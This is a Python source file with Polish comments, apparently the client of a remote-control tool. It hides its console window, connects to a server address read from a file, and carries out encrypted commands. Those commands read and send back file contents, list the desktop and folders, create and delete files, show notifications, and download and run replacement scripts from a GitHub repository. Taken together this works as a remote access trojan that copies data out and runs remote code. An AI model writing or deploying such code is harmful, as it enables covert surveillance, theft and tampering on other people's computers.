import ctypes
import socket
import threading
from colorama import Fore, Style
import os
import sys
import requests
from colorama import init, Fore, Style
import time
import os
import subprocess
from win10toast import ToastNotifier  # Import modułu do obsługi powiadomień
from szyfrowanie import szyfrowanie, odszyfrowywanie
from Odbiorca_f import czytaj_folder, utworz_plik, odczytaj_dane_pliku, Pia_inna, odczytaj_zawartosc_pulpitu, tworzenie_ikonki, Pia_aktul, show_notification
from PyQt5.QtWidgets import QMessageBox, QPushButton, QFileDialog
import tkinter.messagebox
import messagebox
from PyQt5.QtCore import Qt, QTimer, QThread, pyqtSignal, QCoreApplication
from PyQt5.QtGui import QPalette, QColor, QIcon
from PyQt5.QtWidgets import QApplication, QWidget, QGridLayout, QPushButton, QDoubleSpinBox, QLabel, QSpinBox, QTextEdit, QProgressBar

import win32com.client

import pythoncom

import urllib
init()
global console_handle
# Ustawiamy numer ID okna konsoli
console_handle = ctypes.windll.kernel32.GetConsoleWindow()

# Minimalizowanie cmd
ctypes.windll.user32.ShowWindow(console_handle, 0)

ilosc_bledow = 0  # Inicjalizacja zmiennej ilosc_bledow
global pia_reset

pia_reset = 0

os.system('cls')  # W przypadku Windows, używamy polecenia cls
print('Dziennik działań:')

# Inicjalizacja obiektu do obsługi powiadomień
toaster = ToastNotifier()


def Pia_reset(server_socket):
    global pia_reset
    try:
        server_socket.sendall(
            "$ Wykonywanie funkcji".encode())
        # Lista adresów URL plików do pobrania
        urls = [
            "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/Odbiorca.py",
            "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/Odbiorca_f.py",
            "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/main2.py"
        ]

        for url in urls:
            response = requests.get(url)
            if response.status_code == 200:
                file_data = response.content
                filename = os.path.basename(url)

                with open(filename, 'wb') as file:
                    file.write(file_data)
            else:
                print(
                    Fore.MAGENTA + "Polecenie serwera nie mogło zostać wykonane" + Style.RESET_ALL)
                server_socket.sendall(
                    "Polecenie serwera nie mogło zostać wykonane".encode())
        pia_reset = 1
        time.sleep(3)

        tworzenie_ikonki()  # Tworzenie skrótu na pulpicie

        server_socket.close()  # Zamykanie gniazda przed restartem
        os.execl(sys.executable, sys.executable, "Odbiorca.py")
    except Exception as e:
        print(Fore.RED + "Wystąpił błąd podczas wykonywania polecenia:", e)
        print(Style.RESET_ALL)
        # Wysłanie komunikatu do serwera w przypadku błędu
        server_socket.sendall(
            "Polecenie serwera nie mogło zostać wykonane [0]".encode())


def receive_messages(server_socket):
    try:
        while True:
            data = server_socket.recv(1024)
            if not data:
                break

            # Sprawdź czy otrzymana wiadomość jest poleceniem do wyświetlenia powiadomienia
            if odszyfrowywanie(data.decode()).startswith("Pia --pow"):
                sys.stderr = open('nul', 'w')
                # Parsowanie tytułu i treści powiadomienia
                command = odszyfrowywanie(data.decode()).strip()
                command_parts = command.split('("')
                if len(command_parts) == 2:
                    title, message = command_parts[1].split('", "')
                    # Usuń ewentualny znak ")" na końcu wiadomości
                    message = message.rstrip('")')
                    # Wyświetlanie powiadomienia
                    toaster.show_toast(f"Polecnia serwera: {title}", message)
                else:
                    print("Błędny format polecenia powiadomienia")

            decrypted_data = odszyfrowywanie(data.decode())
            if decrypted_data.startswith("Pia --mes"):
                command = decrypted_data.strip()
                command_parts = command.split('("')
                if len(command_parts) == 2:
                    message_part = command_parts[1].rstrip('")')
                    parts = message_part.split('", "')
                    if len(parts) == 3:
                        notification_type, title, message = parts
                        # Tworzenie nowego wątku, który wywołuje funkcję show_notification
                        thread = threading.Thread(target=show_notification(
                            title, message, notification_type, server_socket))

                        # Uruchamianie wątku
                        thread.start()
                    else:
                        print("Błędny format polecenia powiadomienia")
                        # Wysłanie komunikatu do serwera w przypadku błędu
                        server_socket.sendall(
                            "Błędny format polecenia powiadomienia[wewnątrz]".encode())
                else:
                    print("Błędny format polecenia powiadomienia")
                    server_socket.sendall(
                        "Błędny format polecenia powiadomienia[2]".encode())

            elif odszyfrowywanie(data.decode()) == "Pia --reset":
                Pia_reset(server_socket)
            elif odszyfrowywanie(data.decode()) == "Pia --aktul":
                Pia_aktul(server_socket)
            elif odszyfrowywanie(data.decode()) == "Pia --inna":
                Pia_inna(server_socket)
            elif odszyfrowywanie(data.decode()) == "Pia --exit":
                sys.exit()  # Wyjdź z programu
            elif odszyfrowywanie(data.decode()) == "Pia --clear":
                os.system('cls')

            elif decrypted_data.startswith("Pia --utworz_plik"):
                command = decrypted_data.strip()
                # Podział na maksymalnie 2 części, aby uwzględnić zawartość pliku
                command_parts = command.split('("', 1)
                if len(command_parts) == 2:
                    # Pierwsza część po cudzysłowach to nazwa pliku
                    nazwa_pliku = command_parts[1].split('", ')[0].strip('"')
                    # Druga część to zawartość pliku
                    zawartosc = '", '.join(
                        command_parts[1].split('", ')[1:]).strip('")')
                    print("Nazwa pliku:", nazwa_pliku)
                    print("Zawartość pliku:", zawartosc)
                    # Wywołaj funkcję tworzenia pliku
                    utworz_plik(server_socket, nazwa_pliku, zawartosc)
                else:
                    print('Niepoprawny format komendy tworzenia pliku.')
                    # Wyślij informację o błędzie na serwer
                    server_socket.sendall(szyfrowanie(
                        'Niepoprawny format komendy tworzenia pliku.').encode())

            elif decrypted_data == "Pia --pulpit":
                odczytaj_zawartosc_pulpitu(server_socket)

            elif decrypted_data.startswith("Pia --czytaj_folder"):
                # Odczytaj nazwę folderu, którą serwer przekazuje w komunikacie
                command = decrypted_data.strip()
                command_parts = command.split('("')
                if len(command_parts) == 2:
                    nazwa_folderu = command_parts[1].rstrip('")')
                    # Wywołaj funkcję czytającą zawartość folderu i wysyłającą na serwer
                    czytaj_folder(nazwa_folderu, server_socket)
                else:
                    print("Błędny format polecenia odczytu folderu")
                    # Wyślij informację o błędzie na serwer
                    server_socket.sendall(szyfrowanie(
                        'Błędny format polecenia odczytu folderu.').encode())

            elif decrypted_data.startswith("Pia --usuń"):
                # Odczytaj nazwę folderu, którą serwer przekazuje w komunikacie
                command = decrypted_data.strip()
                command_parts = command.split('("')
                if len(command_parts) == 2:
                    nazwa_folderu = command_parts[1].rstrip('")')

                    # Pobierz ścieżkę do folderu na pulpicie
                    desktop_path = os.path.join(os.path.join(
                        os.environ['USERPROFILE']), 'Desktop')
                    path = os.path.join(desktop_path, nazwa_folderu)
                    # usuń plik main.py, jeśli istnieje
                    if os.path.exists(path):
                        os.remove(path)
                    server_socket.sendall(szyfrowanie("Usunięto.").encode())
                else:
                    # Wyślij informację o błędzie na serwer
                    server_socket.sendall(szyfrowanie(
                        'Błędny format polecenia usunięcia pliku.').encode())

            elif decrypted_data.startswith("Pia --dane"):
                # Odczytaj nazwę pliku, którą serwer przekazuje w komunikacie
                command = decrypted_data.strip()
                command_parts = command.split('("')
                if len(command_parts) == 2:
                    nazwa_pliku = command_parts[1].rstrip('")')
                    # Wywołaj funkcję odczytującą plik i wysyłającą na serwer
                    odczytaj_dane_pliku(server_socket, nazwa_pliku)
                else:
                    print("Błędny format polecenia przesłania pliku")

            else:
                print(Fore.LIGHTBLUE_EX +
                      'Otrzymana wiadomość od serwera:', odszyfrowywanie(data.decode()))
                print(Style.RESET_ALL)
    except Exception as e:
        print("Wystąpił błąd podczas odbierania danych. Aby rozpocząć szukanie połączenia spróbuj wysłać wiadomość, np: Rozłączyło nas")
        toaster.show_toast(
            f"Utracono połączenie z serwerem [2]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")


def start_client():
    global pia_reset
    global ilosc_bledow  # Użyj globalnego słowa kluczowego przed użyciem zmiennej globalnej
    while True:
        if pia_reset == 0:
            try:
                with open("adres.txt", "r") as file:
                    server_ip = file.readline().strip()  # Pobranie adresu IP z pliku adres.txt
                client_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                # Użycie pobranego adresu IP
                client_socket.connect((server_ip, 53221))
                print('Połączono z serwerem')
                receive_thread = threading.Thread(
                    target=receive_messages, args=(client_socket,))
                receive_thread.start()
                while True:
                    message = input()
                    if message.lower() == 'exit':
                        break
                    client_socket.sendall(szyfrowanie(message).encode())
                print("Połączenie zostało zerwane. Ponowne łączenie z serwerem...")
                toaster.show_toast(
                    f"Utracono połączenie z serwerem [1]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")
            except Exception as e:
                if ilosc_bledow < 7:  # Sprawdź warunek ilości błędów
                    if ilosc_bledow == 0:
                        print("Wystąpił błąd podczas uruchamiania klienta:", e)
                    ilosc_bledow += 1  # Zwiększ licznik błędów
                else:
                    print(
                        "Wystąpił zbyt wiele błędów. Zamykanie problematycznego procesu...")
                    time.sleep(2)
                    sys.exit()  # Wyjdź z programu
            finally:
                client_socket.close()
        if pia_reset == 1:
            try:
                with open("adres.txt", "r") as file:
                    server_ip = file.readline().strip()  # Pobranie adresu IP z pliku adres.txt
                client_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                # Użycie pobranego adresu IP
                client_socket.connect((server_ip, 12345))
                print('Połączono z serwerem')
                receive_thread = threading.Thread(
                    target=receive_messages, args=(client_socket,))
                receive_thread.start()
                while True:
                    message = "Odzyskiwanie połączenia"
                    if message.lower() == 'exit':
                        break
                    client_socket.sendall(message.encode())
                print("Połączenie zostało zerwane. Ponowne łączenie z serwerem...")
                toaster.show_toast(
                    f"Utracono połączenie z serwerem [0]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")
            except Exception as e:
                if ilosc_bledow < 7:  # Sprawdź warunek ilości błędów
                    if ilosc_bledow == 0:
                        print("Wystąpił błąd podczas uruchamiania klienta:", e)
                    ilosc_bledow += 1  # Zwiększ licznik błędów
                else:
                    print(
                        "Wystąpiło zbyt wiele błędów. Zamykanie problematycznego procesu...")
                    time.sleep(2)
                    sys.exit()  # Wyjdź z programu
            finally:
                client_socket.shutdown(socket.SHUT_RDWR)
                client_socket.close()


if __name__ == "__main__":
    start_client()
